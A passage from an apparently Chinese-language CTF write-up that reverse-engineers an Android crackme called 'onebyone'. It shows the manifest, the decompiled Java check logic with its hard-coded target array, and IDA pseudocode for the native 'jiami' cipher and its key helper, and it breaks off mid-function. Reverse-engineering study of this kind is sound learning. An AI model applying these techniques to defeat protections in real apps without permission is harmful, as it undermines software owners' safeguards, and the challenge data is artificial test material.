class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br><span class="line">                &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;android.app.lib_name&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">        &lt;provider</span><br><span class="line">            android:name=<span class="string">&quot;androidx.startup.InitializationProvider&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">            android:authorities=<span class="string">&quot;com.example.onebyone.androidx-startup&quot;</span>&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;androidx.emoji2.text.EmojiCompatInitializer&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=<span class="string">&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot;</span></span><br><span class="line">                android:value=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span><br><span class="line">        &lt;/provider&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
<p>看这个xml的意义是什么呢？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一、为什么从AndroidManifest.xml开始？</span><br><span class="line">1. 找到程序的&quot;地图&quot;</span><br><span class="line">AndroidManifest.xml是Android应用的配置文件，相当于：</span><br><span class="line">建筑的蓝图（知道入口在哪里）</span><br><span class="line">书的目录（知道有哪些章节）</span><br><span class="line">游戏的攻略（知道关卡和规则）</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 关键信息 --&gt;</span><br><span class="line">package=&quot;com.example.onebyone&quot;  // 包名</span><br><span class="line">android:debuggable=&quot;true&quot;       // 可以动态调试！</span><br><span class="line">activity android:name=&quot;com.example.onebyone.MainActivity&quot;  // 主入口</span><br></pre></td></tr></table></figure>
<p>核心信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;intent-filter&gt;</span><br><span class="line">    &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br><span class="line">    &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br><span class="line">&lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure>
<p><code>MainActivity</code>是用户点击图标时第一个打开的界面。复杂的应用可能有多个activity。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.onebyone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.example.onebyone.databinding.ActivityMainBinding;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span>[] jiami(<span class="type">int</span>[] iArr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;onebyone&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">ActivityMainBinding</span> <span class="variable">activityMainBindingInflate</span> <span class="operator">=</span> ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="built_in">this</span>.binding = activityMainBindingInflate;</span><br><span class="line">        setContentView(activityMainBindingInflate.getRoot());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">input</span> <span class="operator">=</span> (EditText) findViewById(R.id.edit1);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">calculateButton</span> <span class="operator">=</span> (Button) findViewById(R.id.button1);</span><br><span class="line">        calculateButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.example.onebyone.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                MainActivity.<span class="built_in">this</span>.processInput(input.getText().toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">processInput</span><span class="params">(String userInput)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span>[] result = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] result1 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] result2 = &#123;<span class="number">206</span>, <span class="number">176</span>, <span class="number">51</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">30</span>, <span class="number">199</span>, <span class="number">248</span>, <span class="number">5</span>, <span class="number">103</span>, <span class="number">255</span>, <span class="number">154</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">69</span>, <span class="number">190</span>, <span class="number">160</span>, <span class="number">235</span>, <span class="number">131</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">112</span>, <span class="number">22</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> (userInput.length() != <span class="number">24</span>) &#123;</span><br><span class="line">                        state = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), <span class="string">&quot;长度错误&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    System.exit(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    result = calculate(userInput);</span><br><span class="line">                    state = <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">24</span>];</span><br><span class="line">                    state = <span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">                        <span class="type">long</span> <span class="variable">value</span> <span class="operator">=</span> result[i];</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">                            arr[(i * <span class="number">8</span>) + j] = (<span class="type">int</span>) ((value &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    state = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                    result1 = jiami(arr);</span><br><span class="line">                    state = <span class="number">6</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.equals(result1, result2)) &#123;</span><br><span class="line">                        state = <span class="number">7</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">8</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), <span class="string">&quot;正确！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), <span class="string">&quot;错误！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">long</span>[] calculate(String input) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span>[] arr4 = <span class="keyword">new</span> <span class="title class_">long</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">long</span>[] a = <span class="keyword">new</span> <span class="title class_">long</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">t</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; input.length()) &#123;</span><br><span class="line">                        state = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="type">String</span> <span class="variable">group</span> <span class="operator">=</span> input.substring(i, Math.min(i + <span class="number">8</span>, input.length()));</span><br><span class="line">                    arr4[i / <span class="number">8</span>] = Long.parseLong(stringToHex(group).substring(<span class="number">0</span>), <span class="number">16</span>);</span><br><span class="line">                    i += <span class="number">8</span>;</span><br><span class="line">                    state = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    j = <span class="number">0</span>;</span><br><span class="line">                    state = <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">if</span> (j &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        state = <span class="number">4</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">7</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    t = arr4[j];</span><br><span class="line">                    i = <span class="number">0</span>;</span><br><span class="line">                    state = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; <span class="number">64</span>) &#123;</span><br><span class="line">                        state = <span class="number">6</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        a[j] = t;</span><br><span class="line">                        j++;</span><br><span class="line">                        state = <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                    <span class="keyword">if</span> ((t &amp; Long.MIN_VALUE) == Long.MIN_VALUE) &#123;</span><br><span class="line">                        t = ((Long.MAX_VALUE &amp; t) * <span class="number">2</span>) ^ <span class="number">8284901391658006163L</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        t *= <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    i++;</span><br><span class="line">                    state = <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                    <span class="keyword">return</span> a;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> a;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">stringToHex</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">state</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = str.toCharArray();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> (idx &lt; chars.length) &#123;</span><br><span class="line">                        state = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        state = <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    hex.append(String.format(<span class="string">&quot;%02x&quot;</span>, Integer.valueOf(chars[idx])));</span><br><span class="line">                    idx++;</span><br><span class="line">                    state = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">return</span> hex.toString();</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> hex.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在/com/example.onebyone下面可以找到MainActivity。</p>
<p>流程如下：输入 → 长度检查(24位) → calculate()处理 → jiami()加密 → 与密文比较</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] result2 = &#123;<span class="number">206</span>,<span class="number">176</span>,<span class="number">51</span>,<span class="number">89</span>,<span class="number">115</span>,<span class="number">30</span>,<span class="number">199</span>,<span class="number">248</span>,<span class="number">5</span>,<span class="number">103</span>,<span class="number">255</span>,<span class="number">154</span>,<span class="number">27</span>,<span class="number">21</span>,<span class="number">228</span>,<span class="number">69</span>,<span class="number">190</span>,<span class="number">160</span>,<span class="number">235</span>,<span class="number">131</span>,<span class="number">5</span>,<span class="number">16</span>,<span class="number">112</span>,<span class="number">22</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>calculate():</p>
<p><strong>calculate()函数处理</strong></p>
<p>将24字符分成3组（每组8字符）</p>
<p>每组转成16进制，再转成long整数</p>
<p>对每个long进行64次变换（类似线性反馈移位）</p>
<p>jiami函数解压之后ida打开libonebyone.so，找到的函数是Java_com_example_onebyone_MainActivity_jiami</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_com_example_onebyone_MainActivity_jiami</span><span class="params">(_JNIEnv *a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> ArrayLength; <span class="comment">// [rsp+34h] [rbp-6Ch]</span></span><br><span class="line">  __int64 IntArrayElements; <span class="comment">// [rsp+38h] [rbp-68h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+68h] [rbp-38h] BYREF</span></span><br><span class="line">  _DWORD v12[<span class="number">10</span>]; <span class="comment">// [rsp+70h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v12[<span class="number">0</span>] = sub_DB0(<span class="number">104</span>);</span><br><span class="line">  v12[<span class="number">1</span>] = sub_DB0(<span class="number">115</span>);</span><br><span class="line">  v12[<span class="number">2</span>] = sub_DB0(<span class="number">119</span>);</span><br><span class="line">  v12[<span class="number">3</span>] = sub_DB0(<span class="number">83</span>);</span><br><span class="line">  v12[<span class="number">4</span>] = sub_DB0(<span class="number">115</span>);</span><br><span class="line">  v12[<span class="number">5</span>] = sub_DB0(<span class="number">115</span>);</span><br><span class="line">  v12[<span class="number">6</span>] = sub_DB0(<span class="number">93</span>);</span><br><span class="line">  v12[<span class="number">7</span>] = sub_DB0(<span class="number">101</span>);</span><br><span class="line">  sub_DD0(v12, &amp;v11, <span class="number">8</span>);</span><br><span class="line">  IntArrayElements = _JNIEnv::GetIntArrayElements(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !IntArrayElements )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ArrayLength = _JNIEnv::GetArrayLength(a1, a3);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">4LL</span> * ArrayLength);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="number">0</span>) == <span class="number">305419896</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_F10(&amp;v11, <span class="number">8</span>, IntArrayElements, ArrayLength, ptr);</span><br><span class="line">      v5 = _JNIEnv::NewIntArray(a1, ArrayLength);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        _JNIEnv::SetIntArrayRegion(a1, v5, <span class="number">0</span>, ArrayLength, ptr);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">          *((_BYTE *)&amp;v12[<span class="number">-2</span>] + i) = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        _JNIEnv::ReleaseIntArrayElements(a1, a3, IntArrayElements, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        _JNIEnv::ReleaseIntArrayElements(a1, a3, IntArrayElements, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _JNIEnv::ReleaseIntArrayElements(a1, a3, IntArrayElements, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>DB0明显是 用于生成密钥的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_DB0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 ^ <span class="number">0x5Au</span>) + <span class="number">19</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了DD0:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_DD0</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> n8)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= n8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span 